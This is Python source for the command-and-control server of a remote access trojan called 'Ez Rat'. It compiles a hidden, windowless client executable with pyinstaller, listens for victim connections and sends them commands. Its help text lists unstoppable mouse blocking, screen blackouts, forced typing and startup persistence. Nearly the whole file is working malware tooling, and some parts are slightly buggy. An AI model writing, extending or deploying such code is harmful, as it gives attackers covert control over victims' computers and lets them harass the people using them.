import socket
import sys

import fade, json, socket, threading, os, threading
import time

hostname = socket.gethostname()

file = open("C:\\Users\\sampo\\Downloads\\Owl\\Raider\\Raider\\FinishRat\\config.json")
data = json.loads(file.read())
file.close()

print(data['host'])
colour = data["ArtCol"]
SoftCol = data['SoftwareCol']
TextCol = data["TextCol"]

if SoftCol == "purple":
    SoftCol = "\033[35m"

elif SoftCol == "red":
    SoftCol = "\033[31m"

elif SoftCol == "green":
    SoftCol = "\033[32m"

elif SoftCol == "cyan":
    SoftCol = "\033[36m"

elif SoftCol == "blue":
    SoftCol = "\033[34m"

elif SoftCol == "yellow":
    SoftCol = "\033[33m"

elif SoftCol == "lightgrey":
    SoftCol = "\033[37m"



if TextCol == "purple":
    TextCol = "\033[35m"

elif TextCol == "red":
    TextCol = "\033[31m"

elif TextCol == "green":
    TextCol = "\033[32m"

elif TextCol == "cyan":
    TextCol = "\033[36m"

elif TextCol == "blue":
    TextCol = "\033[34m"

elif TextCol == "yellow":
    TextCol = "\033[33m"

elif TextCol == "lightgrey":
    TextCol = "\033[37m"



def printallui():
	os.system("cls||clear")

	text = """
                                  ▓█████ ▒███████▒    ██▀███   ▄▄▄     ▄▄▄█████▓
     _                            ▓█   ▀ ▒ ▒ ▒ ▄▀░   ▓██ ▒ ██▒▒████▄   ▓  ██▒ ▓▒
  ,-(_)-=------,,                 ▒███   ░ ▒ ▄▀▒░    ▓██ ░▄█ ▒▒██  ▀█▄ ▒ ▓██░ ▒░
<  "             ";===""==,.      ▒▓█  ▄   ▄▀▒   ░   ▒██▀▀█▄  ░██▄▄▄▄██░ ▓██▓ ░ 
 `-../ )__... (  ,'        "==    ░▒████▒▒███████▒   ░██▓ ▒██▒ ▓█   ▓██▒ ▒██▒ ░ 
   ===l    ,,==="   PG            ░░ ▒░ ░░▒▒ ▓░▒░▒   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░   
                                   ░ ░  ░░░▒ ▒ ░ ▒     ░▒ ░ ▒░  ▒   ▒▒ ░   ░    
                                     ░   ░ ░ ░ ░ ░     ░░   ░   ░   ▒    ░   
                                     ░  ░  ░ ░          ░           ░  ░ 
                                         ░
"""

	modtext = fade.blackwhite(text)
	print('-- blackwhite -- ')
	print(modtext)
	modtext = fade.purplepink(text)
	print(modtext)
	print('-- purplepink -- ')
	modtext = fade.greenblue(text)
	print(modtext)
	print('-- greenblue -- ')
	modtext = fade.water(text)
	print(modtext)
	print('-- water -- ')
	modtext = fade.fire(text)
	print(modtext)
	print('-- fire -- ')
	modtext = fade.pinkred(text)
	print(modtext)
	modtext = fade.pinkred(text)
	print(modtext)
	print('-- pinkred -- ')
	modtext = fade.brazil(text)
	print(modtext)
	print('-- brazil -- ')
	modtext = fade.random(text)
	print(modtext)
	print('-- random -- ')
	print('')
	print('Change UI colour in "config.json"')
    


def compiler():

	try:
		os.system('pip install pyinstaller')
	except:
		print('Error installing pyinstaller')

	print(f'{SoftCol}╔═\033[36m[{SoftCol}{hostname}@PyRat\033[36m]')
	path = input(f'{SoftCol}╚══[Path To Client Side Script]═>{TextCol} ')

	if input('Include Icon? (y/n ').lower() =='y':
	
		print(f'{SoftCol}╔═\033[36m[{SoftCol}{hostname}@PyRat\033[36m]')
		icon = input(f'{SoftCol}╚══[Path To Icon]═>{TextCol} ')

		icon = icon.replace('"', '').replace("'", '')
		path = path.replace('"', '').replace("'", '')
		print(f'{SoftCol} Compiling... ')
		time.sleep(1)
		os.system(f'pyinstaller --noconfirm --onefile --windowed --icon "{icon}"  "{path}"')
	else:
		path = path.replace('"', '').replace("'", '')
		print(f'{SoftCol} Compiling... ')
		time.sleep(1)
		os.system(f'pyinstaller --noconfirm --onefile --windowed  "{path}"')


		

	
	

def inputhandle(cmd):
	if cmd.lower() =='!quit':
		conn.close()
		s.close()
		sys.exit()

	elif cmd.lower() =='!cls':
		
		ui()

	elif cmd.lower() =='!cls':
		compiler()
	elif cmd.lower() =='!ui':
		printallui()

	elif cmd.lower() =='!compile':
		compiler()

	elif cmd.lower() =='!printallcolours':
		printallui()
	elif cmd.lower() =='!help':
		a = """
		Ez Rat Commands
		=================
		
		server side commands:

		!help - displays all commands
		!quit - quits application
		!cls - clears screen
		!ui - shows all possible ui's
		!compile - compile a client side script

		client side commands:

		mousekill - stops all mouse movement (not stoppable)
		screech - plays a text to speech to client
		cursetype - types out a sentance every five seconds (non stoppable)
		blackscreen - blacks users screen (can fix)
		fixblackscreen - fix's a clients screen
		alert (message) - opens a box with a message
		startup - adds rat to startup

		"""
		print(a)
	


def ui():
    os.system('cls')

    text = """
                                      ▓█████ ▒███████▒    ██▀███   ▄▄▄     ▄▄▄█████▓
         _                            ▓█   ▀ ▒ ▒ ▒ ▄▀░   ▓██ ▒ ██▒▒████▄   ▓  ██▒ ▓▒
      ,-(_)-=------,,                 ▒███   ░ ▒ ▄▀▒░    ▓██ ░▄█ ▒▒██  ▀█▄ ▒ ▓██░ ▒░
    <  "             ";===""==,.      ▒▓█  ▄   ▄▀▒   ░   ▒██▀▀█▄  ░██▄▄▄▄██░ ▓██▓ ░ 
     `-../ )__... (  ,'        "==    ░▒████▒▒███████▒   ░██▓ ▒██▒ ▓█   ▓██▒ ▒██▒ ░ 
       ===l    ,,==="   PG            ░░ ▒░ ░░▒▒ ▓░▒░▒   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░   
                                       ░ ░  ░░░▒ ▒ ░ ▒     ░▒ ░ ▒░  ▒   ▒▒ ░   ░    
                                         ░   ░ ░ ░ ░ ░     ░░   ░   ░   ▒    ░   
                                         ░  ░  ░ ░          ░           ░  ░ 
                                             ░
    """
    if colour =='black-white':
        modtext = fade.blackwhite(text)
        print(modtext)

    elif colour =='purplepink':
        modtext = fade.purplepink(text)
        print(modtext)

    elif colour =='greenblue':
        modtext = fade.greenblue(text)
        print(modtext)

    elif colour =='water':
        modtext = fade.water(text)
        print(modtext)

    elif colour =='fire':
        modtext = fade.fire(text)
        print(modtext)

    elif colour =='pinkred':
        modtext = fade.pinkred(text)
        print(modtext)

    elif colour =='purpleblue':
        modtext = fade.pinkred(text)
        print(modtext)

    elif colour =='brazil':
        modtext = fade.brazil(text)
        print(modtext)

    elif colour =='random':
        modtext = fade.random(text)
        print(modtext)
    



def create_socket():
	try:
                global host
                global port
                global s

                
                if data['host'] =='':


                    print(f'{SoftCol}╔═\033[36m[{SoftCol}{hostname}@PyRat\033[36m]')
                    host = input(f'{SoftCol}╚══[Host]═>{TextCol} ')
                else:
                    host = data['host']


                if data['port'] =='':

                    print(f'{SoftCol}╔═\033[36m[{SoftCol}{hostname}@PyRat\033[36m]')
                    port = input(f'{SoftCol}╚══[Port]═>{TextCol} ')

                else:
                    port = data['port']
                    port = int(port)

                



                

                s = socket.socket() 
	except socket.error as msg:
		print("Error creating socket: " + str(msg))


def socket_bind():
	try:
		global host
		global port
		global s
		print("Binding socket to port: " + str(port))
		s.bind((host, port)) 
		s.listen(5)
	except socket.error as msg:
		print("Error binding socket to port: " + str(msg) + "\n" + "Retrying...")
		socket_bind()


def socket_accept():
	conn, address = s.accept()
	print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
	send_commands(conn)
	conn.close()


def send_commands(conn):

	while True:
		print('')
		

		print(f'{SoftCol}╔═\033[36m[{SoftCol}{hostname}@PyRat\033[36m]')
		cmd = input(f'{SoftCol}╚══[CMD]═>{TextCol} ')



		if "!" in cmd:
			inputhandle(cmd)

		elif len(str.encode(cmd)) > 0: 
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(1024))
			print(client_response, end="")
			 

def main():
    compiler()
    ui()
    create_socket()
    socket_bind()
    socket_accept()

main()